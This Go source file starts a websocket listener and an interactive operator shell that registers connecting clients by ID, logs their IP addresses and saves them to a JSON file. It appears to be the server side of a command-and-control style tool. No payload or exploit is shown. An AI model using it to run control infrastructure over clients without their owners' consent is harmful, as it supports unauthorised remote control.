package main

import (
	"flag"
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/websocket"
	"gopkg.in/abiosoft/ishell.v2"
)

var port = flag.String("port", "8080", "Inbound connection port.")
var database = flag.String("db", "", "File path for persistent JSON file.")
var verbose = flag.Bool("verbose", false, "Display extra logging.")

var shell = ishell.New()

var upgrader = websocket.Upgrader{}

func main() {
	flag.Parse()

	// Set the logger on the connection namespace.
	logger = REPLLog

	go startServer()

	shell.Println(`
 _________  ___   ___   ______
/________/\/__/\ /__/\ /_____/\
\__.::.__\/\::\ \\  \ \\::::_\/_
   \::\ \   \::\/_\ .\ \\:\/___/\
    \::\ \   \:: ___::\ \\::___\/_
     \::\ \   \: \ \\::\ \\:\____/\
      \__\/    \__\/ \::\/ \_____\/
 ______   ______   ________   ______    ______   ______   ___ __ __   ______
/_____/\ /_____/\ /_______/\ /_____/\  /_____/\ /_____/\ /__//_//_/\ /_____/\
\::::_\/_\::::_\/_\::: _  \ \\:::_ \ \ \::::_\/_\:::_ \ \\::\| \| \ \\::::_\/_
 \:\/___/\\:\/___/\\::(_)  \ \\:(_) ) )_\:\/___/\\:\ \ \ \\:.      \ \\:\/___/\
  \:::._\/ \::___\/_\:: __  \ \\: __  \ \\_::._\:\\:\ \ \ \\:.\-/\  \ \\::___\/_
   \:\ \    \:\____/\\:.\ \  \ \\ \  \ \ \ /____\:\\:\_\ \ \\. \  \  \ \\:\____/\
 ___\_\/  ___\_____\/_\__\/\__\/_\_\/ \_\/ \_____\/ \_____\/ \__\/ \__\/ \_____\/
/_____/\ /_______/\/_/\ /_/\ /_____/\
\::::_\/_\__.::._\/\:\ \\ \ \\::::_\/_
 \:\/___/\  \::\ \  \:\ \\ \ \\:\/___/\
  \:::._\/  _\::\ \__\:\_/.:\ \\::___\/_
   \:\ \   /__\::\__/\\ ..::/ / \:\____/\
    \_\/   \________\/ \___/_(   \_____\/
`)

	InitCommands(shell)

	shell.Run()
}

func acceptClient(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		REPLLog(fmt.Sprintf("Connection Issue: %s", err.Error()), 1)
		return
	}

	conn := &Conn{send: make(chan []byte, 256), ws: ws, IsActive: true}

	go conn.writePump()

	REPLLog("Client connected!", 0)

	var (
		client *Client
		cid    int64 = 0
	)

	REPLLog(r.URL.String(), 0)

	if r.URL.Query().Get("cid") != "" {
		cid, err = strconv.ParseInt(r.URL.Query().Get("cid"), 10, 64)
	}

	client, err = ClientIndex.getClientByID(cid)
	if err != nil {
		client = ClientIndex.addClient(cid, conn)
		client.Send(fmt.Sprintf("type=init&client_id=%v", client.ID))
	} else {
		client.Connection = conn
		client.Connection.IsActive = true
	}

	client.ExternalIP = r.RemoteAddr
	client.Connection.ParentID = client.ID
	client.Connection.readCallback = func(conn *Conn, message string) {
		//client.Connection.send <- []byte("Active")
		IncomingRouter(conn, message)
	}

	client.Connection.readPump()
}

func REPLLog(message string, level int) {
	if level > 0 {
		if *verbose {
			shell.Println("[LOG]: " + message)
		}
	} else {
		shell.Println("[LOG]: " + message)
	}
}

func startServer() {
	if *database != "" {
		if err := ClientIndex.fileLoad(*database); err != nil {
			fmt.Println(err.Error())
		}

		go func() {
			for {
				dur, _ := time.ParseDuration("5m")
				time.Sleep(dur)

				if err := ClientIndex.fileSave(*database); err != nil {
					fmt.Println(err.Error())
				}
			}
		}()
	}

	dur, _ := time.ParseDuration("2s")
	time.Sleep(dur)

	REPLLog("Starting server and accepting connections...", 0)

	http.HandleFunc("/ready", acceptClient)
	http.ListenAndServe("localhost:"+*port, nil)
}
